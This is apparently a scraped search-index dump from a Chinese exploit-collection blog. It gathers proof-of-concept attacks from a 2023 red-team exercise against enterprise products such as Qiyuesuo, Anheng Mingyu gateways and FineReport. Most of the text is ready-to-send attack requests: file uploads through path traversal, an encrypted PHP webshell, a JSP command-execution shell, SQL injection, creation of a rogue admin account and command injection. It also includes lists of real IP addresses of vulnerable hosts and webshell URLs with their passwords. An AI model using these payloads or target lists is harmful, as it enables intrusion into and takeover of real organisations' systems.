fofa\rtitle=\"新天擎\" ","date":"2023-12-08","objectID":"/%E5%A5%87%E5%AE%89%E4%BF%A1%E5%A4%A9%E6%93%8E%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"奇安信天擎终端安全管理系统信息泄露漏洞","uri":"/%E5%A5%87%E5%AE%89%E4%BF%A1%E5%A4%A9%E6%93%8E%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"poc http://114.113.151.164:18080/runtime/admin_log_conf.cache http://218.2.231.183:9080/runtime/admin_log_conf.cache ","date":"2023-12-08","objectID":"/%E5%A5%87%E5%AE%89%E4%BF%A1%E5%A4%A9%E6%93%8E%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"奇安信天擎终端安全管理系统信息泄露漏洞","uri":"/%E5%A5%87%E5%AE%89%E4%BF%A1%E5%A4%A9%E6%93%8E%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"```\rPOST /captcha/%2e%2e/template/html/add HTTP/1.1 Host: xxx Accept-Encoding: gzip, deflate Accept: / Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: application/json Content-Length: 16398 {“file”:“abc”,“title”:“abc”,“params”:[{“extensionParam”:\"{\"expression\":\"var org.springframework.expression.spel.standard.SpelExpressionParser();var b=‘base64 编 码 后 的 内 存 马 ‘;var b64=java.util.Base64.getDecoder();var deStr=new java.lang.String(b64.decode(b),‘UTF-8’);var c=a‘parseExpression’ ;c.getValue();\"}\",“name”:“test”}]} ","date":"2023-12-08","objectID":"/%E5%A5%91%E7%BA%A6%E9%94%81%E7%94%B5%E5%AD%90%E7%AD%BE%E7%AB%A0%E5%B9%B3%E5%8F%B0-templatehtmladd-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"契约锁电子签章平台 templatehtmladd 远程命令执行漏洞","uri":"/%E5%A5%91%E7%BA%A6%E9%94%81%E7%94%B5%E5%AD%90%E7%AD%BE%E7%AB%A0%E5%B9%B3%E5%8F%B0-templatehtmladd-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"```\rPOST /callback/%2E%2E;/code/upload HTTP/1.1 Host: ip:port User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9 Content-Type:multipart/form-data; boundary=—-GokVTLZMRxcJWKfeCvEsYHlszxEANApZseNMGLki —-GokVTLZMRxcJWKfeCvEsYHlszxEANApZseNMGLki Content-Disposition: form-data; name=“type”; TIMETASK —-GokVTLZMRxcJWKfeCvEsYHlszxEANApZseNMGLki Content-Disposition: form-data; name=“file”; filename=“qys.jpg” 马儿 —-GokVTLZMRxcJWKfeCvEsYHlszxEANApZseNMGLki ","date":"2023-12-08","objectID":"/%E5%A5%91%E7%BA%A6%E9%94%81%E7%94%B5%E5%AD%90%E7%AD%BE%E7%AB%A0%E7%B3%BB%E7%BB%9F-code-upload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:0:0","tags":["2023hw"],"title":"契约锁电子签章系统 code upload 任意文件上传","uri":"/%E5%A5%91%E7%BA%A6%E9%94%81%E7%94%B5%E5%AD%90%E7%AD%BE%E7%AB%A0%E7%B3%BB%E7%BB%9F-code-upload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":["2023hw漏洞"],"content":"契约锁电子签章系统RCE POST /callback/%2E%2E;/code/upload HTTP/1.1 Host: 103.242.174.137:9180 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Origin: https://103.242.174.137:9180 Referer: https://103.242.174.137:9180 X-Requested-With: XMLHttpRequest Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryco2lQ5vxCOn9Aq2R Connection: close ------WebKitFormBoundaryco2lQ5vxCOn9Aq2R Content-Disposition: form-data; name=\"type\"; TIMETASK ------WebKitFormBoundaryco2lQ5vxCOn9Aq2R Content-Disposition: form-data; name=\"file\";filename=\"qys.jpg\" package qiyuesuo; import com.qiyuesuo.utask.java.BaseTimerTask; public class qiyuesuo004 extends BaseTimerTask { static {try{Runtime.getRuntime().exec(\"whoami\");}catch (Exception e){}} } ------WebKitFormBoundaryco2lQ5vxCOn9Aq2R-- ","date":"2023-12-08","objectID":"/%E5%A5%91%E7%BA%A6%E9%94%81%E7%94%B5%E5%AD%90%E7%AD%BE%E7%AB%A0%E7%B3%BB%E7%BB%9Frce/:1:0","tags":["2023hw漏洞"],"title":"契约锁电子签章系统RCE","uri":"/%E5%A5%91%E7%BA%A6%E9%94%81%E7%94%B5%E5%AD%90%E7%AD%BE%E7%AB%A0%E7%B3%BB%E7%BB%9Frce/"},{"categories":["2023hw漏洞"],"content":"好视通视频会议系统 toDownload.do接口任意文件读取漏洞 好视通 是国内云视频会议知名品牌，拥有多项创新核心技术优势、多方通信服务牌照及行业全面资质 ，专注为政府、公检法司、教育、集团企业等用户提供“云+端+业务全场景”解决方案。其视频会议系统的路径(fastmeeting) /register/toDownload.do?fileName= 存在任意文件遍历漏洞，可通过fileName参数读取任意文件。 弱口令admin/admin ","date":"2023-12-08","objectID":"/%E5%A5%BD%E8%A7%86%E9%80%9A%E8%A7%86%E9%A2%91%E4%BC%9A%E8%AE%AE%E7%B3%BB%E7%BB%9F-todownload.do%E6%8E%A5%E5%8F%A3-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"好视通视频会议系统 toDownload.do接口 任意文件读取漏洞","uri":"/%E5%A5%BD%E8%A7%86%E9%80%9A%E8%A7%86%E9%A2%91%E4%BC%9A%E8%AE%AE%E7%B3%BB%E7%BB%9F-todownload.do%E6%8E%A5%E5%8F%A3-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"fofa \"深圳银澎云计算有限公司\" ","date":"2023-12-08","objectID":"/%E5%A5%BD%E8%A7%86%E9%80%9A%E8%A7%86%E9%A2%91%E4%BC%9A%E8%AE%AE%E7%B3%BB%E7%BB%9F-todownload.do%E6%8E%A5%E5%8F%A3-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw漏洞"],"title":"好视通视频会议系统 toDownload.do接口 任意文件读取漏洞","uri":"/%E5%A5%BD%E8%A7%86%E9%80%9A%E8%A7%86%E9%A2%91%E4%BC%9A%E8%AE%AE%E7%B3%BB%E7%BB%9F-todownload.do%E6%8E%A5%E5%8F%A3-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"poc /register/toDownload.do?fileName=敏感文件路径 https://xxxxxx/register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini ","date":"2023-12-08","objectID":"/%E5%A5%BD%E8%A7%86%E9%80%9A%E8%A7%86%E9%A2%91%E4%BC%9A%E8%AE%AE%E7%B3%BB%E7%BB%9F-todownload.do%E6%8E%A5%E5%8F%A3-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw漏洞"],"title":"好视通视频会议系统 toDownload.do接口 任意文件读取漏洞","uri":"/%E5%A5%BD%E8%A7%86%E9%80%9A%E8%A7%86%E9%A2%91%E4%BC%9A%E8%AE%AE%E7%B3%BB%E7%BB%9F-todownload.do%E6%8E%A5%E5%8F%A3-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## fofa\rtitle=\"明御安全网关\" ","date":"2023-12-08","objectID":"/%E5%AE%89%E6%81%92%E6%98%8E%E5%BE%A1%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-aaa_local_web_preview-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"安恒明御安全网关 aaa_local_web_preview 文件上传漏洞","uri":"/%E5%AE%89%E6%81%92%E6%98%8E%E5%BE%A1%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-aaa_local_web_preview-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"poc POST /webui/?g=aaa_local_web_preview\u0026name=123\u0026read=0\u0026suffix=/../../../HKfQgRMO.php HTTP/1.1 Host: 111.17.161.250:8043 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Type: multipart/form-data; boundary=849978f98abe41119122148e4aa65b1a Referer: https://111.17.161.250:8043 Accept-Encoding: gzip Content-Length: 671 --849978f98abe41119122148e4aa65b1a Content-Disposition: form-data; name=\"123\"; filename=\"405cFf.php\" Content-Type: text/plain \u003c?php @error_reporting(0); session_start(); $key=\"e45e329feb5d925b\"; $_SESSION['k']=$key; session_write_close(); $post=file_get_contents(\"php://input\"); if(!extension_loaded('openssl')) {$t=\"base64_\".\"decode\"; $post=$t($post.\"\"); for($i=0;$i\u003cstrlen($post);$i++) {$post[$i] = $post[$i]^$key[$i+1\u002615]; }} else {$post=openssl_decrypt($post, \"AES128\", $key);} $arr=explode('|',$post); $func=$arr[0]; $params=$arr[1]; class C{public function __invoke($p) {eval($p.\"\");}} @call_user_func(new C(),$params); ?\u003e --849978f98abe41119122148e4aa65b1a-- WebShell URL: https://111.17.161.250:8043/HKfQgRMO.php Password: rebeyond WebShell tool: Behinder v3.0 Webshell type: php ","date":"2023-12-08","objectID":"/%E5%AE%89%E6%81%92%E6%98%8E%E5%BE%A1%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-aaa_local_web_preview-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"安恒明御安全网关 aaa_local_web_preview 文件上传漏洞","uri":"/%E5%AE%89%E6%81%92%E6%98%8E%E5%BE%A1%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-aaa_local_web_preview-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"漏洞列表 https://111.17.161.250:8043 http://113.204.212.42:8084 https://122.225.61.202:4434 https://122.9.61.40:44300 http://122.9.61.41:1080 https://122.9.61.41:44300 https://122.9.61.42:44300 http://122.9.61.94:1080 https://202.107.190.91:60001 http://221.224.214.186:5555 http://222.142.60.105:8081 http://49.73.47.13:5555 ","date":"2023-12-08","objectID":"/%E5%AE%89%E6%81%92%E6%98%8E%E5%BE%A1%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-aaa_local_web_preview-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw"],"title":"安恒明御安全网关 aaa_local_web_preview 文件上传漏洞","uri":"/%E5%AE%89%E6%81%92%E6%98%8E%E5%BE%A1%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-aaa_local_web_preview-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## poc\rhttps://localhost/sslvpn/sslvpn_client.php?client=logoImg\u0026img=6drcdfs34c1h /tmp || ls |tee /etc/hosts /usr/local/webui/webui/images/basic/login/main_logo21.txt || ls http://221.224.214.186:5555/webui/images/basic/login/main_logo21.txt ","date":"2023-12-08","objectID":"/%E5%AE%89%E6%81%92%E6%98%8E%E5%BE%A1%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-sslvpn_client.php-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"安恒明御安全网关 sslvpn_client.php 远程代码执行漏洞","uri":"/%E5%AE%89%E6%81%92%E6%98%8E%E5%BE%A1%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-sslvpn_client.php-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## fofa\r\"明御运维审计与风险控制系统\" ","date":"2023-12-08","objectID":"/%E5%AE%89%E6%81%92%E6%98%8E%E5%BE%A1%E8%BF%90%E7%BB%B4%E5%AE%A1%E8%AE%A1%E4%B8%8E%E9%A3%8E%E9%99%A9%E6%8E%A7%E5%88%B6%E7%B3%BB%E7%BB%9F%E5%A0%A1%E5%9E%92%E6%9C%BA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E6%B3%A8%E5%86%8C/:0:0","tags":["2023hw"],"title":"安恒明御运维审计与风险控制系统堡垒机任意用户注册","uri":"/%E5%AE%89%E6%81%92%E6%98%8E%E5%BE%A1%E8%BF%90%E7%BB%B4%E5%AE%A1%E8%AE%A1%E4%B8%8E%E9%A3%8E%E9%99%A9%E6%8E%A7%E5%88%B6%E7%B3%BB%E7%BB%9F%E5%A0%A1%E5%9E%92%E6%9C%BA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E6%B3%A8%E5%86%8C/"},{"categories":["2023hw"],"content":"poc POST /service/?unix:/../../../../var/run/rpc/xmlrpc.sock|http://test/wsrpc HTTP/1.1 Host: Cookie: LANG=zh; DBAPPUSM=ee4bbf6c85e541bb980ad4e0fbee2f57bb15bafe20a7028af9a0b8901cf80fd3 Content-Length: 1117 Cache-Control: max-age=0 Sec-Ch-Ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"100\", \"Google Chrome\";v=\"100\" Sec-Ch-Ua-Mobile: ?0 Sec-Ch-Ua-Platform: \"Windows\" Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 Content-Type: application/x-www-form-urlencoded Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close \u003c?xml version=\"1.0\"?\u003e \u003cmethodCall\u003e \u003cmethodName\u003eweb.user_add\u003c/methodName\u003e \u003cparams\u003e \u003cparam\u003e \u003cvalue\u003e \u003carray\u003e \u003cdata\u003e \u003cvalue\u003e \u003cstring\u003eadmin\u003c/string\u003e \u003c/value\u003e \u003cvalue\u003e \u003cstring\u003e5\u003c/string\u003e \u003c/value\u003e \u003cvalue\u003e \u003cstring\u003e10.0.0.1\u003c/string\u003e \u003c/value\u003e \u003c/data\u003e \u003c/array\u003e \u003c/value\u003e \u003c/param\u003e \u003cparam\u003e \u003cvalue\u003e \u003cstruct\u003e \u003cmember\u003e \u003cname\u003euname\u003c/name\u003e \u003cvalue\u003e \u003cstring\u003etest\u003c/string\u003e \u003c/value\u003e \u003c/member\u003e \u003cmember\u003e \u003cname\u003ename\u003c/name\u003e \u003cvalue\u003e \u003cstring\u003etest\u003c/string\u003e \u003c/value\u003e \u003c/member\u003e \u003cmember\u003e \u003cname\u003epwd\u003c/name\u003e \u003cvalue\u003e \u003cstring\u003e1qaz@3edC12345\u003c/string\u003e \u003c/value\u003e \u003c/member\u003e \u003cmember\u003e \u003cname\u003eauthmode\u003c/name\u003e \u003cvalue\u003e \u003cstring\u003e1\u003c/string\u003e \u003c/value\u003e \u003c/member\u003e \u003cmember\u003e \u003cname\u003edeptid\u003c/name\u003e \u003cvalue\u003e \u003cstring\u003e\u003c/string\u003e \u003c/value\u003e \u003c/member\u003e \u003cmember\u003e \u003cname\u003eemail\u003c/name\u003e \u003cvalue\u003e \u003cstring\u003e\u003c/string\u003e \u003c/value\u003e \u003c/member\u003e \u003cmember\u003e \u003cname\u003emobile\u003c/name\u003e \u003cvalue\u003e \u003cstring\u003e\u003c/string\u003e \u003c/value\u003e \u003c/member\u003e \u003cmember\u003e \u003cname\u003ecomment\u003c/name\u003e \u003cvalue\u003e \u003cstring\u003e\u003c/string\u003e \u003c/value\u003e \u003c/member\u003e \u003cmember\u003e \u003cname\u003eroleid\u003c/name\u003e \u003cvalue\u003e \u003cstring\u003e102\u003c/string\u003e \u003c/value\u003e \u003c/member\u003e \u003c/struct\u003e\u003c/value\u003e \u003c/param\u003e \u003c/params\u003e \u003c/methodCall\u003e ","date":"2023-12-08","objectID":"/%E5%AE%89%E6%81%92%E6%98%8E%E5%BE%A1%E8%BF%90%E7%BB%B4%E5%AE%A1%E8%AE%A1%E4%B8%8E%E9%A3%8E%E9%99%A9%E6%8E%A7%E5%88%B6%E7%B3%BB%E7%BB%9F%E5%A0%A1%E5%9E%92%E6%9C%BA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E6%B3%A8%E5%86%8C/:1:0","tags":["2023hw"],"title":"安恒明御运维审计与风险控制系统堡垒机任意用户注册","uri":"/%E5%AE%89%E6%81%92%E6%98%8E%E5%BE%A1%E8%BF%90%E7%BB%B4%E5%AE%A1%E8%AE%A1%E4%B8%8E%E9%A3%8E%E9%99%A9%E6%8E%A7%E5%88%B6%E7%B3%BB%E7%BB%9F%E5%A0%A1%E5%9E%92%E6%9C%BA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E6%B3%A8%E5%86%8C/"},{"categories":["2023hw漏洞"],"content":"安美数字酒店宽带运营系统SQL注入漏洞 ","date":"2023-12-08","objectID":"/%E5%AE%89%E7%BE%8E%E6%95%B0%E5%AD%97%E9%85%92%E5%BA%97%E5%AE%BD%E5%B8%A6%E8%BF%90%E8%90%A5%E7%B3%BB%E7%BB%9Fsql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"安美数字酒店宽带运营系统SQL注入漏洞","uri":"/%E5%AE%89%E7%BE%8E%E6%95%B0%E5%AD%97%E9%85%92%E5%BA%97%E5%AE%BD%E5%B8%A6%E8%BF%90%E8%90%A5%E7%B3%BB%E7%BB%9Fsql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"fofa title=酒店宽带运营系统 ","date":"2023-12-08","objectID":"/%E5%AE%89%E7%BE%8E%E6%95%B0%E5%AD%97%E9%85%92%E5%BA%97%E5%AE%BD%E5%B8%A6%E8%BF%90%E8%90%A5%E7%B3%BB%E7%BB%9Fsql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw漏洞"],"title":"安美数字酒店宽带运营系统SQL注入漏洞","uri":"/%E5%AE%89%E7%BE%8E%E6%95%B0%E5%AD%97%E9%85%92%E5%BA%97%E5%AE%BD%E5%B8%A6%E8%BF%90%E8%90%A5%E7%B3%BB%E7%BB%9Fsql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"POC POST /language.php HTTP/1.1 Content-Type: application/x-www-form-urlencoded X-Requested-With: XMLHttpRequest Cookie: PHPSESSID=3n9dv7r0vl6fcvirnlvp2oh1t4; dashboroad=srgua4gv7d2jnichvtl66l1146 Content-Length: 263 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE) Host: Connection: Keep-alive EditStatus=1\u0026LangEName=pHqghUme\u0026LangID=1\u0026LangName=pHqghUme\u0026LangType=0000%E7%B3%BB%E7%BB%9F%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF\u0026Lately=555-666-0606\u0026Search=the\u0026SerialID=1\u0026Type=0'XOR(if(now()=sysdate()%2Csleep(5)%2C0))XOR'Z\u0026UID=add\u0026submit=%20%E6%B7%BB%20%E5 ","date":"2023-12-08","objectID":"/%E5%AE%89%E7%BE%8E%E6%95%B0%E5%AD%97%E9%85%92%E5%BA%97%E5%AE%BD%E5%B8%A6%E8%BF%90%E8%90%A5%E7%B3%BB%E7%BB%9Fsql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw漏洞"],"title":"安美数字酒店宽带运营系统SQL注入漏洞","uri":"/%E5%AE%89%E7%BE%8E%E6%95%B0%E5%AD%97%E9%85%92%E5%BA%97%E5%AE%BD%E5%B8%A6%E8%BF%90%E8%90%A5%E7%B3%BB%E7%BB%9Fsql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"宏景OA文件上传 POST /w_selfservice/oauthservlet/%2e./.%2e/system/options/customreport/OfficeServer.jsp HTTP/1.1 Host: xx.xx.xx.xx Cookie: JSESSIONID=C92F3ED039AAF958516349D0ADEE426E User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Content-Length: 417 DBSTEP V3.0 351 0 666 DBSTEP=REJTVEVQ OPTION=U0FWRUZJTEU= currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66 FILETYPE=Li5cMW5kZXguanNw RECOR1DID=qLSGw4SXzLeGw4V3wUw3zUoXwid6 originalFileId=wV66 originalCreateDate=wUghPB3szB3Xwg66 FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6 needReadFile=yRWZdAS6 originalCreateDate=wLSGP4oEzLKAz4=iz=66 1 ","date":"2023-12-08","objectID":"/%E5%AE%8F%E6%99%AFoa%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:1:0","tags":["2023hw漏洞"],"title":"宏景OA文件上传","uri":"/%E5%AE%8F%E6%99%AFoa%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":["2023hw"],"content":"https://github.com/diyhi/bbs/issues/51\r","date":"2023-12-08","objectID":"/%E5%B7%A1%E4%BA%91%E8%BD%BB%E8%AE%BA%E5%9D%9B%E7%B3%BB%E7%BB%9F/:0:0","tags":["2023hw"],"title":"巡云轻论坛系统","uri":"/%E5%B7%A1%E4%BA%91%E8%BD%BB%E8%AE%BA%E5%9D%9B%E7%B3%BB%E7%BB%9F/"},{"categories":["2023hw"],"content":"fofa icon_hash=\"610890487\" ","date":"2023-12-08","objectID":"/%E5%B7%A1%E4%BA%91%E8%BD%BB%E8%AE%BA%E5%9D%9B%E7%B3%BB%E7%BB%9F/:1:0","tags":["2023hw"],"title":"巡云轻论坛系统","uri":"/%E5%B7%A1%E4%BA%91%E8%BD%BB%E8%AE%BA%E5%9D%9B%E7%B3%BB%E7%BB%9F/"},{"categories":["2023hw"],"content":"后台 admin/login ","date":"2023-12-08","objectID":"/%E5%B7%A1%E4%BA%91%E8%BD%BB%E8%AE%BA%E5%9D%9B%E7%B3%BB%E7%BB%9F/:2:0","tags":["2023hw"],"title":"巡云轻论坛系统","uri":"/%E5%B7%A1%E4%BA%91%E8%BD%BB%E8%AE%BA%E5%9D%9B%E7%B3%BB%E7%BB%9F/"},{"categories":["2023hw"],"content":"## fofa\rapp=\"帆软-FineReport\" ","date":"2023-12-08","objectID":"/%E5%B8%86%E8%BD%AF-v9-reportserver-%E6%8A%A5%E8%A1%A8%E8%BD%AF%E4%BB%B6-reportserver%E6%96%87%E4%BB%B6-filepath-%E5%8F%82%E6%95%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"帆软 v9 ReportServer 报表软件 ReportServer文件 filePath 参数文件上传漏洞","uri":"/%E5%B8%86%E8%BD%AF-v9-reportserver-%E6%8A%A5%E8%A1%A8%E8%BD%AF%E4%BB%B6-reportserver%E6%96%87%E4%BB%B6-filepath-%E5%8F%82%E6%95%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"exp POST /WebReport/ReportServer HTTP/1.1 Host: 119.84.139.156:81 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Type: application/json Accept-Encoding: gzip Content-Length: 317 {\"__CONTENT__\":\"\u003c%java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\\\"cmd\\\")).getInputStream();int a = -1;byte[] b = new byte[2048];while((a=in.read(b))!=-1){out.println(new String(b));}%\u003e\",\"cmd\":\"design_save_svg\",\"op\":\"svginit\",\"filePath\":\"httpchartmapsvg/../../../log.svgCBed467BfbeB1caF.jsp\"} GET /WebReport/log.svgCBed467BfbeB1caF.jsp?cmd=whoami HTTP/1.1 Host: 119.84.139.156:81 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Accept-Encoding: gzip report.elementwin.com:80 https://report.elementwin.com 117.27.235.72:9009 118.190.78.32:8080 119.84.139.156:81 https://122.114.167.82 122.114.167.82:80 122.224.56.147:8081 122.224.56.147:80 https://122.224.56.147 221.12.118.171:8081 hy.lngkic.com:80 ","date":"2023-12-08","objectID":"/%E5%B8%86%E8%BD%AF-v9-reportserver-%E6%8A%A5%E8%A1%A8%E8%BD%AF%E4%BB%B6-reportserver%E6%96%87%E4%BB%B6-filepath-%E5%8F%82%E6%95%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"帆软 v9 ReportServer 报表软件 ReportServer文件 filePath 参数文件上传漏洞","uri":"/%E5%B8%86%E8%BD%AF-v9-reportserver-%E6%8A%A5%E8%A1%A8%E8%BD%AF%E4%BB%B6-reportserver%E6%96%87%E4%BB%B6-filepath-%E5%8F%82%E6%95%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"```\recho “xxxx” | base64 -d | curl -X POST -d @- http://1.58.73.61/webroot/decision/remote/design/channel POST /api/v1/ysoserial HTTP/1.1 Host: gobygo.net User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip Content-Length: 152 gadget=CommonsBeanutils1183NOCC¶meters=EX-MS-TFMSFromThread-bx\u0026encoding=base64\u0026url=%2FGqExyxgcDfcc\u0026password=goby\u0026referer=https%3A%2F%2Fgobygo.net%2F WebShell URL: http://1.58.73.61/webroot/mXkgBodBCjKN Password: goby Webshell tool: Behinder v3.0 Webshell type: jsp Referer: https://gobygo.net/ ## goby自动化 POST /api/v1/debugExp HTTP/1.1 Content-Type: application/json;charset=UTF-8 Authorization: Basic dXNlcjpwYXNz host: 82.156.29.211:8365 Connection: close Content-Length: 358 